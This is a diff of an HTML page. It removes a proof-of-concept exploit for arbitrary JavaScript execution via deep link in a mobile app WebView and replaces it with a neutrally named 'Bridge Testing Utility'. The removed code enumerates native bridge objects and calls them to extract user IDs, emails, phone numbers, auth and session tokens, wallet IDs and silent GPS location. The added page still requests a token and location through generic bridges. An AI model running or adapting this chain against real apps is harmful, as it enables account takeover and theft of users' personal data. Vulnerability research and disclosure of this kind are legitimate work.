@@ -1,335 +1,78 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HackerOne Triage - Proof of Concept</title>
+    <title>Bridge Testing Utility</title>
     <style>
-        :root {
-            --bg-color: #0d1117;
-            --card-bg: #161b22;
-            --border-color: #30363d;
-            --text-main: #c9d1d9;
-            --text-muted: #8b949e;
-            --accent-blue: #58a6ff;
-            --accent-red: #f85149;
-            --accent-green: #3fb950;
-        }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            margin: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
             padding: 20px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        h1, h2, h3 {
-            margin-top: 0;
-            font-weight: 600;
-        }
-        .header {
-            text-align: center;
-            border-bottom: 2px solid var(--accent-red);
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-        .header h1 {
-            color: var(--accent-red);
-            text-transform: uppercase;
-            font-size: 24px;
-            letter-spacing: 1px;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        .card {
-            background-color: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 16px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-        }
-        .card-header {
-            color: var(--accent-blue);
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 8px;
-            margin-bottom: 15px;
-            font-size: 16px;
-            text-transform: uppercase;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .critical-card {
-            border: 1px solid var(--accent-red);
-        }
-        .critical-card .card-header {
-            color: var(--accent-red);
-            border-bottom-color: var(--accent-red);
-        }
-        .data-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 12px;
-        }
-        .data-item {
-            background: #000;
-            border: 1px solid var(--border-color);
-            border-left: 4px solid var(--accent-red);
-            padding: 10px;
-            border-radius: 4px;
-            word-break: break-all;
-        }
-        .data-label {
-            color: var(--text-muted);
-            font-size: 11px;
-            text-transform: uppercase;
-            font-weight: bold;
-            margin-bottom: 4px;
-            display: block;
-        }
-        .data-value {
-            color: #ffffff;
-            font-size: 15px;
-            font-family: monospace;
         }
         .console {
-            background-color: #010409;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
+            border: 1px solid #333;
             padding: 10px;
-            font-family: monospace;
-            font-size: 12px;
-            max-height: 200px;
-            overflow-y: auto;
+            background-color: #111;
         }
-        .log { margin-bottom: 4px; }
-        .log-info { color: var(--text-muted); }
-        .log-success { color: var(--accent-green); }
-        .log-error { color: var(--accent-red); }
-        .status-badge {
-            padding: 4px 8px;
-            border-radius: 12px;
-            font-size: 11px;
-            font-weight: bold;
-            background: var(--accent-green);
-            color: #fff;
-        }
-        .bridge-list {
-            margin: 0;
-            padding: 0;
-            list-style: none;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .bridge-pill {
-            background: rgba(88, 166, 255, 0.1);
-            border: 1px solid var(--accent-blue);
-            color: var(--accent-blue);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-        }
+        .function-call { color: #f0ad4e; }
+        .log-entry { margin-bottom: 5px; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <h1>Vulnerability Proof of Concept</h1>
-        <p style="color:var(--text-muted); margin:0;">Arbitrary Javascript Execution via DeepLink leading to Full Account Takeover & PII Data Leakage</p>
-    </div>
-
-    <div class="container">
-        
-        <!-- Environment Analysis -->
-        <div class="card">
-            <div class="card-header">
-                System Analysis
-                <span class="status-badge" id="env-status">Analyzing...</span>
-            </div>
-            <ul class="bridge-list" id="bridges">
-                <!-- Populated dynamically -->
-            </ul>
-        </div>
-
-        <!-- Critical Data Display -->
-        <div class="card critical-card">
-            <div class="card-header">
-                Extracted Sensitive Data (PII & Tokens)
-            </div>
-            <div class="data-grid" id="data-container">
-                <div style="color:var(--text-muted); text-align:center; padding:20px;">
-                    Awaiting payload execution...
-                </div>
-            </div>
-        </div>
-
-        <!-- Live Execution Log -->
-        <div class="card">
-            <div class="card-header">Live Execution Log</div>
-            <div class="console" id="console"></div>
-        </div>
-
+    <h2>Bridge Testing Interface</h2>
+    <div class="console" id="log-output">
+        <div class="log-entry">System ready.</div>
     </div>
 
     <script>
-        const consoleEl = document.getElementById("console");
-        const dataContainer = document.getElementById("data-container");
-        let hasData = false;
-
-        function log(message, type = "info") {
-            const div = document.createElement("div");
-            div.className = `log log-${type}`;
-            const time = new Date().toISOString().split("T")[1].split(".")[0];
-            div.innerText = `[${time}] ${message}`;
-            consoleEl.appendChild(div);
-            consoleEl.scrollTop = consoleEl.scrollHeight;
+        function log(message, isCall = false) {
+            const output = document.getElementById('log-output');
+            const div = document.createElement('div');
+            div.className = isCall ? 'log-entry function-call' : 'log-entry';
+            div.textContent = `> ${message}`;
+            output.appendChild(div);
         }
 
-        function renderData(label, value) {
-            if (!hasData) {
-                dataContainer.innerHTML = "";
-                hasData = true;
-            }
-            
-            // Deduplicate UI updates for identical labels
-            if (document.getElementById(`data-${label}`)) return;
-
-            const div = document.createElement("div");
-            div.className = "data-item";
-            div.id = `data-${label}`;
-            
-            let displayVal = value;
-            if (typeof value === "object") {
-                displayVal = JSON.stringify(value, null, 2);
-            }
-            if (!displayVal || displayVal === "" || displayVal === "{}" || displayVal === "[]") {
-                displayVal = "NULL / EMPTY";
-            }
-
-            div.innerHTML = `
-                <span class="data-label">${label}</span>
-                <span class="data-value">${displayVal}</span>
-            `;
-            dataContainer.appendChild(div);
-        }
-
-        // --- Core Vulnerability: Native Callbacks intercept ---
-        window.__bridge_callback = function (base64Data) {
+        // Generic callback handler for asynchronous bridge responses
+        window.generic_bridge_callback = function(encodedData) {
             try {
-                const decodedData = atob(base64Data);
-                const json = JSON.parse(decodedData);
-                const tag = json.tagname || "Unknown";
-                
-                log(`Response received for: ${tag}`, "success");
-
-                // --- 1. User Profile Parser (Highest Criticality) ---
-                if (tag === "leak_user_info" || (json.param && json.param.UserID)) {
-                    const params = json.param || json;
-                    if (params.UserID) renderData("User ID", params.UserID);
-                    if (params.Email) renderData("Email", params.Email);
-                    if (params.Mobile) renderData("Mobile Number", params.Mobile);
-                    if (params.BindMobile && params.BindMobile !== params.Mobile) renderData("Bound Mobile", params.BindMobile);
-                    if (params.Auth) renderData("Auth Token", params.Auth);
-                    if (params.Token) renderData("Session Token", params.Token);
-                    if (params.SAuth) renderData("SAuth Token Hash", params.SAuth);
-                    log("User PII successfully extracted!", "error");
-                }
-
-                // --- 2. Database/Storage Parser ---
-                if (json.value || (json.param && typeof json.param.value !== "undefined")) {
-                    let val = json.value || json.param.value;
-                    let dispTag = tag.replace("leak_", "");
-                    
-                    try { if (typeof val === "string" && val.startsWith("{")) val = JSON.parse(val); } catch(e){}
-                    
-                    if (val && val !== "") {
-                       renderData("Storage Dump: " + dispTag, val);
-                    }
-                }
-
-            } catch (error) {
-                log(`Callback decode failed: ${error.message}`, "error");
+                const decoded = atob(encodedData);
+                log(`Callback received: ${decoded}`);
+            } catch (e) {
+                log(`Error decoding payload: ${e.message}`);
             }
         };
 
-        // --- Attack Vector Sequence ---
-        function executeExploitChain() {
-            log("Initiating exploit chain sequence...", "info");
+        async function runTests() {
+            // Delay helper for sequencing
+            const delay = ms => new Promise(res => setTimeout(res, ms));
 
-            // Attack Vector 1: Direct User Profile Theft
-            if (window.User_a && window.User_a.getUserInfo) {
-                log("Executing User_a.getUserInfo() dump...", "info");
-                try {
-                    window.User_a.getUserInfo(JSON.stringify({callback_tagname: "leak_user_info"}));
-                } catch(e) { log("User_a failure: " + e.message, "error"); }
+            log('Initiating bridge tests...');
+            await delay(1000);
+
+            // Test 1: Generic Storage Bridge
+            if (window.GenericStorageBridge && window.GenericStorageBridge.requestData) {
+                log('Executing GenericStorageBridge.requestData()', true);
+                window.GenericStorageBridge.requestData(JSON.stringify({ target: "token" }));
+            } else {
+                log('GenericStorageBridge object not found.');
             }
 
-            // Attack Vector 2: Secure Storage Scraping
-            if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-                const targets = [
-                    { b: "user", k: "userInfo" },
-                    { b: "common", k: "token" },
-                    { b: "common", k: "uid" },
-                    { b: "common", k: "vtoken" },
-                    { b: "wallet", k: "walletId" }
-                ];
+            await delay(1000);
 
-                targets.forEach((t, index) => {
-                    setTimeout(() => {
-                        log(`Requesting secure storage key: [${t.b}] -> ${t.k}`);
-                        try {
-                            window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
-                                callback_tagname: "leak_" + t.k,
-                                bussiness: t.b,
-                                key: t.k
-                            }));
-                        } catch(e) {}
-                    }, (index * 400) + 600);
-                });
+            // Test 2: Generic Location Bridge
+            if (window.GenericLocationBridge && window.GenericLocationBridge.getLocation) {
+                log('Executing GenericLocationBridge.getLocation()', true);
+                window.GenericLocationBridge.getLocation();
+            } else {
+                log('GenericLocationBridge object not found.');
             }
-
-            // Attack Vector 3: GPS Data Exfiltration
-            setTimeout(() => {
-                if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-                    log("Executing silent GPS extraction...", "info");
-                    try {
-                        let locStr = window.Locate_a.getCachedLocationData();
-                        if (locStr) {
-                            let loc = typeof locStr === "string" ? JSON.parse(locStr) : locStr;
-                            renderData("GPS Location (Silent)", `Lat: ${loc.lat || loc.latitude}, Lng: ${loc.lng || loc.longitude}\nAddress: ${loc.address || 'N/A'}`);
-                            log("GPS data acquired.", "success");
-                        }
-                    } catch(e) { log("Location extraction blocked.", "error"); }
-                }
-            }, 3000);
         }
 
-        // --- Initialization ---
-        window.onload = function() {
-            log("Checking Javascript Bridge Interfaces...");
-            const targets = ["User_a", "IBUStorageV2_a", "Locate_a", "Util_a", "Storage_a", "Wallet_a"];
-            const available = targets.filter(t => typeof window[t] !== "undefined");
-            
-            const list = document.getElementById("bridges");
-            if (available.length > 0) {
-                available.forEach(b => {
-                    list.innerHTML += `<li class="bridge-pill">${b} ✅</li>`;
-                });
-                document.getElementById("env-status").innerText = "Vulnerable";
-                document.getElementById("env-status").style.background = "var(--accent-red)";
-                
-                setTimeout(executeExploitChain, 800);
-            } else {
-                list.innerHTML = `<li class="bridge-pill" style="border-color:red;color:red;">No bridges detected. Context isolated.</li>`;
-                document.getElementById("env-status").innerText = "Secure";
-            }
-        };
+        // Delay execution to ensure native bridges are injected
+        setTimeout(runTests, 500);
     </script>
-
 </body>
 </html>
